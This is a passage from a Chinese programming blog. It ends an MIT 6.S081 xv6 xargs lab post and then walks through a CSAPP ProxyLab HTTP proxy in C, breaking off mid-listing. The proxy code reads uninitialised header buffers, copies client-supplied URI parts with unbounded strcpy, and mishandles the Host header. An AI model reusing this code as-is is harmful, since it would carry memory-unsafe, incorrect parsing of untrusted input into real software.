class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>) &#123;</span><br><span class="line">            exec(args[<span class="number">0</span>], args);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            wait(&amp;status);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>修改 Makefile 文件</li>
</ul>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UPROGS=\</span><br><span class="line">	<span class="comment"># ...</span></span><br><span class="line">	$U/_find\</span><br><span class="line">	$U/_xargs\</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>make qemu &amp;&amp; sh &lt; xargstest.sh</strong> 在 xv6 shell 中运行一下</li>
</ul>
<img src="/2024/04/26/6-S081-Lab1/image-20240429230054163.png" class="" title="image-20240429230054163">

<blockquote>
<p>符合预期！</p>
</blockquote>
<ul>
<li><strong>.&#x2F;grade-lab-util xargs</strong> 进行测试，结果如下</li>
</ul>
<img src="/2024/04/26/6-S081-Lab1/image-20240429230151764.png" class="" title="image-20240429230151764">

<blockquote>
<p>通过！其实这里的测试和在 xv6 shell 中运行脚本测试是一样的 ……</p>
</blockquote>
<h1 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h1><ul>
<li><strong>make grade</strong>，结果如下</li>
</ul>
<img src="/2024/04/26/6-S081-Lab1/image-20240429230435789.png" class="" title="image-20240429230435789">

<blockquote>
<p>99 分！应该通过了吧</p>
</blockquote>
<ul>
<li>减了 1 分是因为 <strong>time：FAIL</strong>，官方要求我们创建一个新文件 <code>time.txt</code>，并在其中放入一个整数，即我在 lab 上花费的小时数</li>
</ul>
<blockquote>
<p>嗯，这里就不透露了，哈哈哈</p>
</blockquote>
<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ul>
<li>实验环境配置相关</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/428502480">2021 MIT6.S081 Xv6 实验环境配置 - 知乎 (zhihu.com)</a></p>
<blockquote>
<p><code>git clone git://g.csail.mit.edu/xv6-labs-2021</code> 获取实验源码时可能会遇到错误，将 2021 该为 2023 应该就可以了（当然之后可能就又不行了，需要随着时间更改）</p>
</blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/limengshi138392/article/details/129378589">Ubuntu22.04系统：fatal: 无法连接到 github.com</a></p>
<blockquote>
<p>在 Ubuntu 上从 github 使用 git clone 可能会遇到问题</p>
</blockquote>
<ul>
<li>实验相关</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/edadada/article/details/126533075">6.S081-Lab1 总结笔记（0基础向）_lab1make grade 出错-CSDN博客</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/624091268">MIT 6.S081 Operating System  - 知乎 (zhihu.com)</a></p>
<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/505537995">MIT-6.S081 | Lab1-Unix utilities - 知乎 (zhihu.com)</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://yiweiboi.github.io/2024/04/15/CSAPP-Lab8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yiweiBoi">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Hexo">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2024/04/15/CSAPP-Lab8/" class="post-title-link" itemprop="url">CSAPP ProxyLab</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2024-04-15 19:18:55" itemprop="dateCreated datePublished" datetime="2024-04-15T19:18:55+08:00">2024-04-15</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2024-04-27 16:18:10" itemprop="dateModified" datetime="2024-04-27T16:18:10+08:00">2024-04-27</time>
              </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><ul>
<li><p>实验讲义：<a target="_blank" rel="noopener" href="https://csapp.cs.cmu.edu/3e/proxylab.pdf">proxylab.pdf (cmu.edu)</a></p>
</li>
<li><p>在本实验中，您将编写一个缓存 Web 对象的简单 HTTP 代理，实验分为三个部分</p>
<ul>
<li>在第一部分中，您将设置代理以接受客户端的传入连接、读取和解析请求、将请求转发到 Web 服务器、读取服务器的响应，并将这些响应转发到相应的客户端</li>
<li>在第二部分中，您将升级代理以处理多个并发连接</li>
<li>在第三部分中，您将使用最近访问的 Web 内容的简单主内存缓存向代理添加缓存</li>
</ul>
</li>
<li><p>什么是 Web 代理</p>
<blockquote>
<p>Web 代理是充当 Web 浏览器和终端服务器之间的中间人的程序。浏览器不是直接联系终端服务器来获取网页，而是联系代理，代理将请求转发到终端服务器。当终端服务器回复代理时，代理会将回复发送到浏览器</p>
</blockquote>
</li>
</ul>
<h1 id="Implementing-a-sequential-web-proxy"><a href="#Implementing-a-sequential-web-proxy" class="headerlink" title="Implementing a sequential web proxy"></a>Implementing a sequential web proxy</h1><h2 id="Requests"><a href="#Requests" class="headerlink" title="Requests"></a>Requests</h2><ul>
<li><p><strong>HTTP&#x2F;1.0 GET requests</strong></p>
<ul>
<li><p>当客户端在 Web 浏览器向 Web 代理发送 <code>GET http://www.cmu.edu/hub/index.html HTTP/1.1 </code> 请求时，Web 代理应该解析请求并确定它应该打开与 <code>www.cmu.edu</code>  的连接，并发送自己的 HTTP 请求 <code>GET /hub/index.html HTTP/1.0</code></p>
<blockquote>
<p>注意是 HTTP&#x2F;1.0</p>
</blockquote>
</li>
<li><p>请注意，HTTP 请求中的所有行都以回车符后跟换行符 <code>&quot;\r\n&quot;</code> 结尾；同样重要的是，每个 HTTP 请求都由一个空行终止 <code>&quot;\r\n&quot;</code></p>
</li>
</ul>
</li>
<li><p><strong>Request headers</strong></p>
<ul>
<li><p>始终发送 Host 标头，访问 <code>http://www. cmu.edu/hub/index.html</code>，您的代理将发送 <code>Host: www.cmu.edu</code></p>
<blockquote>
<p>Web 浏览器可能会将自己的 Host 标头附加到其 HTTP 请求中，如 <code>GET http://www.cmu.edu/hub/index.html HTTP/1.1</code></p>
</blockquote>
</li>
<li><p>始终发送 User-Agent 标头：<code>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3</code></p>
</li>
<li><p>始终发送 Connection 标头：<code>Connection: close</code></p>
</li>
<li><p>始终发送 Proxy-Connection 标头：<code>Proxy-Connection: close</code></p>
</li>
<li><p>如果浏览器将任何其他请求标头作为 HTTP 请求的一部分发送，则代理应将其原封不动地转发</p>
</li>
</ul>
</li>
<li><p><strong>Port numbers</strong></p>
<ul>
<li>HTTP 请求端口可能出现在 HTTP 请求的 URL 字段中，如 <code>http://www.cmu.edu:8080/hub/index.html</code>，那么此时 Web 代理应该连接到 <code>www.cmu.edu</code> 主机上的 8080 端口，否则为默认的 HTTP 端口 80</li>
<li>Web 代理的监听端口通过命令行参数指定。如使用命令 <code>./proxy 15213</code>，那么 Web 代理的监听端口为 15213</li>
</ul>
</li>
</ul>
<h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><ul>
<li><p>Web 代理的 main 函数和书上描述的服务器的 main 函数非常相似</p>
</li>
<li><p>检查是否是仅有一个参数（argv[0] 是文件名，argv[1] 是监听端口号参数）</p>
</li>
<li><p>讲义中提示我们捕获且忽略 <code>SIGPIPE</code> 信号，避免终止进程</p>
<blockquote>
<p>当服务器写一个已经关闭了的连接，第一次写会正常返回，第二次写就会发送 SIGPIPE 信号，这个信号的默认行为是终止进程</p>
</blockquote>
</li>
<li><p>在 while 循环中不断 Accept 得到与客户端连接的描述符、doit 处理客户端发送的请求，不要忘记 Close 关闭描述符</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> listenfd, connfd;</span><br><span class="line">    <span class="type">socklen_t</span> clientlen;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_storage</span> <span class="title">clientaddr</span>;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">2</span>) &#123;</span><br><span class="line">    	<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">&quot;usage: %s &lt;port&gt;\n&quot;</span>, argv[<span class="number">0</span>]);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Signal(SIGPIPE, sigpipe_handler);</span><br><span class="line">    listenfd = Open_listenfd(argv[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    	clientlen = <span class="keyword">sizeof</span>(clientaddr);</span><br><span class="line">    	connfd = Accept(listenfd, (SA *)&amp;clientaddr, &amp;clientlen);</span><br><span class="line">    	doit(connfd);</span><br><span class="line">    	Close(connfd);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>我们的 SIGPIPE 信号处理程序什么也不做，仅仅是忽略它</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigpipe_handler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="doit"><a href="#doit" class="headerlink" title="doit"></a>doit</h2><ul>
<li><p>doit 函数解析请求、将请求转发到 Web 服务器、读取服务器的响应，并将这些响应转发到相应的客户端</p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">doit</span><span class="params">(<span class="type">int</span> fd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE], method[MAXLINE], uri[MAXLINE], version[MAXLINE];</span><br><span class="line">    <span class="type">char</span> hostname[MAXLINE], port[MAXLINE], filename[MAXLINE];</span><br><span class="line">    <span class="type">rio_t</span> rio;</span><br><span class="line">    </span><br><span class="line">    Rio_readinitb(&amp;rio, fd);</span><br><span class="line">    Rio_readlineb(&amp;rio, buf, MAXLINE); <span class="comment">// 读取请求行</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">sscanf</span>(buf, <span class="string">&quot;%s %s %s&quot;</span>, method, uri, version);</span><br><span class="line">    <span class="keyword">if</span> (strcasecmp(method, <span class="string">&quot;GET&quot;</span>)) &#123;	<span class="comment">// 只能处理 GET 方法</span></span><br><span class="line">    	<span class="keyword">return</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    </span><br><span class="line">    parse_uri(uri, hostname, port, filename);	<span class="comment">// 解析 uri</span></span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> requesthdrs[MAXLINE];</span><br><span class="line">    build_requesthdrs(&amp;rio, requesthdrs, filename, hostname);	<span class="comment">// 构建请求行和请求报头</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> severfd = Open_clientfd(hostname, port);	<span class="comment">// 得到和服务器连接的描述符</span></span><br><span class="line">    <span class="keyword">if</span> (severfd &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;connection faild\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    Rio_writen(severfd, requesthdrs, <span class="built_in">strlen</span>(requesthdrs));	<span class="comment">// 将请求行和请求报头发送给服务器</span></span><br><span class="line">    </span><br><span class="line">    echo(severfd, fd);	<span class="comment">// 处理服务器的响应</span></span><br><span class="line">    </span><br><span class="line">    Close(severfd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="parse-uri"><a href="#parse-uri" class="headerlink" title="parse_uri"></a>parse_uri</h2><ul>
<li><p>parse_uri 函数解析 URI 为 hostname 主机名、port 端口号和 filename 文件路径</p>
<blockquote>
<p>我们可以假设 uri 为 <code>http://www.cmu.edu:8080/hub/index.html</code> 来进行模拟</p>
</blockquote>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">parse_uri</span><span class="params">(<span class="type">char</span> *uri, <span class="type">char</span> *hostname, <span class="type">char</span> *port, <span class="type">char</span> *filename)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> *ptr_h;</span><br><span class="line">    <span class="keyword">if</span> ((ptr_h = <span class="built_in">strstr</span>(uri, <span class="string">&quot;//&quot;</span>))) &#123; <span class="comment">// 有 hostname</span></span><br><span class="line">    	<span class="type">char</span> *ptr_p;</span><br><span class="line">    	</span><br><span class="line">        <span class="keyword">if</span> ((ptr_p = index(ptr_h, <span class="string">&#x27;:&#x27;</span>))) &#123; <span class="comment">// 有 port</span></span><br><span class="line">    	    <span class="type">char</span> *ptr_f = index(ptr_p, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    	    <span class="built_in">strcpy</span>(filename, ptr_f);</span><br><span class="line">    	    *ptr_f = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    	    </span><br><span class="line">            <span class="built_in">strcpy</span>(port, ptr_p + <span class="number">1</span>);</span><br><span class="line">    	    *ptr_p = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    	    <span class="built_in">strcpy</span>(hostname, ptr_h + <span class="number">2</span>); </span><br><span class="line">    	</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; <span class="comment">// 没有 port</span></span><br><span class="line">    	    <span class="type">char</span> *ptr_f = index(ptr_h + <span class="number">2</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    	    <span class="built_in">strcpy</span>(filename, ptr_f);</span><br><span class="line">    	    *ptr_f = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    	    </span><br><span class="line">            <span class="built_in">strcpy</span>(hostname, ptr_h + <span class="number">2</span>);</span><br><span class="line">    	    <span class="built_in">strcpy</span>(port, <span class="string">&quot;80&quot;</span>);</span><br><span class="line">    	&#125;</span><br><span class="line">    </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;	<span class="comment">// 没有 hostname，也没有 port</span></span><br><span class="line">    	<span class="built_in">strcpy</span>(filename, uri);</span><br><span class="line">    	<span class="built_in">strcpy</span>(hostname, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    	<span class="built_in">strcpy</span>(port, <span class="string">&quot;80&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="build-requesthdrs"><a href="#build-requesthdrs" class="headerlink" title="build_requesthdrs"></a>build_requesthdrs</h2><ul>
<li><p>build_requesthdrs 函数构建 HTTP 请求的请求行和请求报头</p>
</li>
<li><p>细节一：rio 缓冲区中还存放客户端 HTTP 请求的请求报头，读取这些报头到 buf 中时，报头结尾的 <code>\r\n</code> 也读到了，所以不用在末尾添加 <code>\r\n</code> 了</p>
</li>
<li><p>细节二：读完客户端 HTTP 请求的所有请求报头后，别忘了在新构建的 HTTP 请求后添加空行 <code>\r\n</code></p>
</li>
<li><p>如何使用 sprintf 函数追加字符串：<a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/ask/sof/147799">如何使用sprintf追加字符串？-腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">build_requesthdrs</span><span class="params">(<span class="type">rio_t</span> *rio, <span class="type">char</span> *requesthdrs, <span class="type">char</span> *filename, <span class="type">char</span> *hostname)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE], host_hdrs[MAXLINE], other_hdrs[MAXLINE];</span><br><span class="line">    <span class="type">char</span> *conn_hdrs = <span class="string">&quot;Connection: close\r\n&quot;</span>, *proxy_hdrs = <span class="string">&quot;Proxy-Connection: close\r\n&quot;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">sprintf</span>(requesthdrs, <span class="string">&quot;GET %s HTTP/1.0\r\n&quot;</span>, filename); <span class="comment">// 请求行</span></span><br><span class="line">    </span><br><span class="line">    Rio_readlineb(rio, buf, MAXLINE);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 请求报头</span></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">strcmp</span>(buf, <span class="string">&quot;\r\n&quot;</span>)) &#123;	<span class="comment">// 还没有读到空行</span></span><br><span class="line">    	</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(buf, <span class="string">&quot;Host&quot;</span>)) &#123;	<span class="comment">// 读到 Host 报头</span></span><br><span class="line">            <span class="built_in">sprintf</span>(host_hdrs, <span class="string">&quot;%s&quot;</span>, buf);</span><br><span class="line">    	</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strstr</span>(buf, <span class="string">&quot;User-Agent&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(buf, <span class="string">&quot;Connection&quot;</span>) &amp;&amp; !<span class="built_in">strstr</span>(buf, <span class="string">&quot;Proxy&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 不是 user、connection、proxy 报头就追加到 other 报头</span></span><br><span class="line">            <span class="built_in">sprintf</span>(other_hdrs + <span class="built_in">strlen</span>(other_hdrs), <span class="string">&quot;%s&quot;</span>, buf);	</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strlen</span>(host_hdrs) == <span class="number">0</span>) &#123;	<span class="comment">// 没有读到 Host 报头，则一定在 uri 中</span></span><br><span class="line">    	    <span class="built_in">sprintf</span>(requesthdrs + <span class="built_in">strlen</span>(requesthdrs), <span class="string">&quot;Host: %s\r\n&quot;</span>, hostname);</span><br><span class="line">    	&#125;</span><br><span class="line">    	</span><br><span class="line">    	Rio_readlineb(rio, buf, MAXLINE);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 别忘了添加空行</span></span><br><span class="line">    <span class="built_in">sprintf</span>(requesthdrs + <span class="built_in">strlen</span>(requesthdrs), <span class="string">&quot;%s%s%s%s\r\n&quot;</span>, user_agent_hdr, conn_hdrs, proxy_hdrs, other_hdrs);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><ul>
<li><p>echo 函数处理服务器发送的响应，并将这些响应发送给客户端</p>
</li>
<li><p>细节：不能  <code>Rio_writen(clientfd, buf, strlen(buf))</code>，因为 readlineb 是一行一行读的，读到以 <code>\n</code> 结尾，而 strlen 的判断是以 <code>\0</code> 结尾</p>
<blockquote>
<p>如果使用 strlen 会造成错误（后两个测试错误）</p>
</blockquote>
</li>
<li><p>具体实现如下</p>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">echo</span><span class="params">(<span class="type">int</span> severfd, <span class="type">int</span> clientfd)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> buf[MAXLINE];</span><br><span class="line">    <span class="type">rio_t</span> rio;</span><br><span class="line">    Rio_readinitb(&amp;rio, severfd);</span><br><span class="line">    <span class="type">size_t</span> n;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> ((n = Rio_readlineb(&amp;rio, buf, MAXLINE)) != <span class="number">0</span>) &#123;</span><br><span class="line">    	Rio_writen(clientfd, buf, n);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h2><ul>
<li>通过 <strong>make</strong> 编译程序，**.&#x2F;driver.sh** 进行测试，测试结果如下</li>
</ul>
<img src="/2024/04/15/CSAPP-Lab8/image-20240417194812789.png" class="" title="image-20240417194812789">

<ul>
<li>第一阶段的 40 分拿到了！</li>
</ul>
<h2 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h2><ul>
<li>整理过后，完整代码如下</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;csapp.h&quot;</span></span></span><br><span class="line"><span class="comment">/* Recommended max cache and object sizes */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_CACHE_SIZE 1049000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_OBJECT_SIZE 102400</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* You won&#x27;t lose style points for including this long line in your code */</span></span><br><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="type">char</span> *user_agent_hdr = <span class="string">&quot;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.3) Gecko/20120305 Firefox/10.0.3\r\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">doit</span><span class="params">(<span class="type">int</span> fd)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">parse_uri</span><span class="params">(<span class="type">char</span> *uri, <span class="type">char</span> *hostname, <span class="type">char</span> *port, <span class="type">char</span> *filename)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">build_requesthdrs</span><span class="params">(<span class="type">rio_t</span> *rio, <span class="type">char</span> *requesthdrs, <span class="type">char</span> *filename, <span class="type">char</span> *hostname)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">echo</span><span class="params">(<span class="type">int</span> severfd, <span class="type">int</span> clientfd)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">sigpipe_handler</span><span class="params">(<span class="type">int</span> sig)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span 